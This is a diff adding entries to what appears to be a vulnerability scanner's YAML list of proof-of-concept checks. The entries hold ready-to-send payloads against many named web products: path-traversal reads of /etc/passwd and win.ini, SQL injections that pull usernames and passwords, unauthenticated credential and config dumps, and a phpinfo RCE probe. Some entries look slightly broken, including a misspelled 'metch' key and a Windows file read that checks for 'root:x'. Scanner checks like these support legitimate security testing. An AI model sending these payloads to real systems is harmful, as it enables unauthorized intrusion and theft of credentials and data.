@@ -421,3 +421,184 @@ pocs:
       - 'root:x'
     matchers-condition: or
     name: "Nexus file read vuln"
+  - metch: "get"
+    path: '/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'
+    body:
+      - 'root:x'
+    matchers-condition: or
+    name: "Apache http server CVE-2021-41733 vuln"
+  - metch: "get"
+    path: '/plug/comment/commentList.asp?id=-1%20unmasterion%20semasterlect%20top%201%20UserID,GroupID,LoginName,Password,now(),null,1%20%20frmasterom%20{prefix}user'
+    body:
+      - 'select'
+      - 'clistbox'
+    matchers-condition: and
+    name: "Aspcms SQL vuln"
+  - metch: "get"
+    path: '/api/swaggerui/static/../../../../../../../../../../../../../../../../etc/passwd'
+    body:
+      - 'root:x'
+    matchers-condition: or
+    name: "Bazaar v1.4.3 CVE-2024-40348 File Read Vuln"
+  - metch: "get"
+    path: '/api/v1/canal/config/1/0'
+    body:
+      - 'clusterId'
+      - 'serverId'
+    matchers-condition: and
+    name: "Alibaba Canal config Info Vuln"
+  - metch: "get"
+    path: '/de2api/engine/getEngine;.js'
+    body:
+      - 'catalogDesc'
+      - 'configuration'
+    matchers-condition: and
+    name: "DataEase CVE-2024-30269 Vuln"
+  - metch: "get"
+    path: '/api/v1/userlist?pageindex=0&pagesize=10'
+    body:
+      - 'Username'
+      - 'Password'
+      - 'RoleName'
+      - 'RoleId'
+    matchers-condition: and
+    name: "EasyCVR User Info Vuln"
+  - metch: "get"
+    path: '/public/plugins/gettingstarted/../../../../../../../../../../../../../../../etc/passwd'
+    body:
+      - 'root:x'
+    matchers-condition: or
+    name: "Grafana File Read Vuln"
+  - metch: "get"
+    path: '/systemController/showOrDownByurl.do?down=&dbPath=../../../../../../etc/passwd'
+    body:
+      - 'root:x'
+    matchers-condition: or
+    name: "JEEVMS File Read Vuln"
+  - metch: "get"
+    path: '/common/down/file?filekey=/../../../../../../../../../etc/passwd'
+    body:
+      - 'root:x'
+    matchers-condition: or
+    name: "JeePlus File Read Vuln"
+  - metch: "get"
+    path: '/a/sys/user/validateMobile?&mobile=1%27+and+1%3D%28updatexml%281%2Cconcat%280x7e%2C%28select+md5%281%29%29%2C0x7e%29%2C1%29%29+and+%271%27%3D%271'
+    body:
+      - 'SQLSTATE'
+      - 'SQL syntax'
+      - 'XPATH syntax error'
+    matchers-condition: or
+    name: "JeePlus SQL Vuln"
+  - metch: "get"
+    path: '/a/sys/user/resetPassword?mobile=13588888888''and (updatexml(1,concat(0x7e,(select user()),0x7e),1))%23'
+    body:
+      - 'SQLSTATE'
+      - 'SQL syntax'
+      - 'XPATH syntax error'
+    matchers-condition: or
+    name: "JeePlus SQL Vuln"
+  - metch: "post"
+    path: '/mobile/Remote/GetParkController'
+    body:
+      - 'SQLSTATE'
+      - 'SQL syntax'
+      - 'XPATH syntax error'
+    data: 'deviceId=1''and/**/extractvalue(1,concat(char(126),database()))and'''
+    matchers-condition: or
+    name: "JieLink+ SQL Vuln"
+  - metch: "get"
+    path: '/api/index.php/v1/config/application?public=true'
+    body:
+      - 'attributes'
+      - 'application'
+    matchers-condition: and
+    name: "Joomla CVE-2023-23752 Vuln"
+  - metch: "get"
+    path: '/api/v1/terminal/sessions/'
+    body:
+      - 'user_id'
+      - 'org_id'
+      - 'account_id'
+    matchers-condition: and
+    name: "JumpServer CVE-2023-42442 Vuln"
+  - metch: "get"
+    path: '/gatewayweb/FileDownloadServlet?fileName=test.txt&filePath=../../../../../../../../../../Windows/System32/drivers/etc/hosts%00.jpg&type=2'
+    body:
+      - 'root:x'
+    matchers-condition: or
+    name: "KEDACOM File Read Vuln"
+  - metch: "get"
+    path: '/nacos/v1/auth/users?pageNo=1&pageSize=10'
+    body:
+      - 'username'
+      - 'password'
+      - 'totalCount'
+    matchers-condition: or
+    name: "Nacos CVE-2021-29441 Vuln"
+  - metch: "get"
+    path: '/v1/cs/configs?export=true&group=&tenant=&appName=&ids=&dataId='
+    body:
+      - 'DEFAULT_GROUP'
+    matchers-condition: or
+    name: "Nacos File Dump Vuln"
+  - metch: "get"
+    path: '/index.php/Index?ext_price%3D1/**/and/**/updatexml(1,concat(0x7e,(SELECT/**/distinct/**/concat(0x23,username,0x3a,password,0x23)/**/FROM/**/ay_user/**/limit/**/0,1),0x7e),1));%23=12'
+    body:
+      - 'SQLSTATE'
+      - 'SQL syntax'
+      - 'XPATH syntax error'
+    matchers-condition: or
+    name: "PbootCMS SQL Vuln"
+  - metch: "get"
+    path: '/index.php/Search/index?keyword=aaaa&updatexml(1,concat(0x7e,(SELECT/**/distinct/**/concat(0x23,username,0x3a,password,0x23)/**/FROM/**/ay_user/**/limit/**/0,1),0x7e),1));%23=123'
+    body:
+      - 'SQLSTATE'
+      - 'SQL syntax'
+      - 'XPATH syntax error'
+    matchers-condition: or
+    name: "PbootCMS SQL Vuln"
+  - metch: "get"
+    path: '/?tag=%7d%73%71%6c%3a%20%20%7b%70%62%6f%6f%74%3a%6c%69%73%74%20%66%69%6c%74%65%72%3d%31%3d%32%29%55%4e%49%4f%4e%28%53%45%4c%45%43%54%2f%2a%2a%2f%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%28%73%65%6c%65%63%74%2f%2a%2a%2f%76%65%72%73%69%6f%6e%28%29%29%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%29%2f%2a%2a%2f%23%2f%2a%2a%2f%7c%31%32%33%20%73%63%6f%64%65%3d%31%32%33%7d%5b%6c%69%73%74%3a%6c%69%6e%6b%20%6c%69%6e%6b%3d%61%73%64%5d%7b%2f%70%62%6f%6f%74%3a%6c%69%73%74%7d'
+    body:
+      - 'SQLSTATE'
+      - 'SQL syntax'
+      - 'XPATH syntax error'
+    matchers-condition: or
+    name: "PbootCMS SQL Vuln"
+  - metch: "get"
+    path: '/sys/dict/loadTreeData?tableName=sys_user&text=password%20text,id&code=password&hasChildField=&converIsLeafVal=1&condition=&pid=admin&pidField=username'
+    body:
+      - 'key'
+      - 'parentId'
+      - 'children'
+    matchers-condition: and
+    name: "PbootCMS SQL Vuln"
+  - metch: "get"
+    path: '/system/dictData/getDictItems/gen_table,user(),1,1'
+    body:
+      - 'dataLabel'
+      - 'dataId'
+    matchers-condition: and
+    name: "Pear Admin Boot SQL Vuln"
+  - metch: "post"
+    path: '/pay/index/pay_callback.html'
+    body:
+      - 'PHP Version'
+      - 'Loaded plugins'
+    data: 'out_trade_no[0]=eq&out_trade_no[1]=1&out_trade_no[2]=phpinfo'
+    matchers-condition: or
+    name: "YzmCMS pay_callback Rce Vuln"
+  - metch: "post"
+    path: '/adminapi/setting/config/save_basics'
+    body:
+      - 'for 16-bit app support'
+    json: { 'weixin_ckeck_file': '../../../../../../../../Windows/win.ini' }
+    matchers-condition: or
+    name: "Crmeb read file vuln"
+  - metch: "post"
+    path: '/adminapi/setting/config/save_basics'
+    body:
+      - 'root:x'
+    json: { 'weixin_ckeck_file': '../../../../../../../../etc/passwd' }
+    matchers-condition: or
+    name: "Crmeb read file vuln"
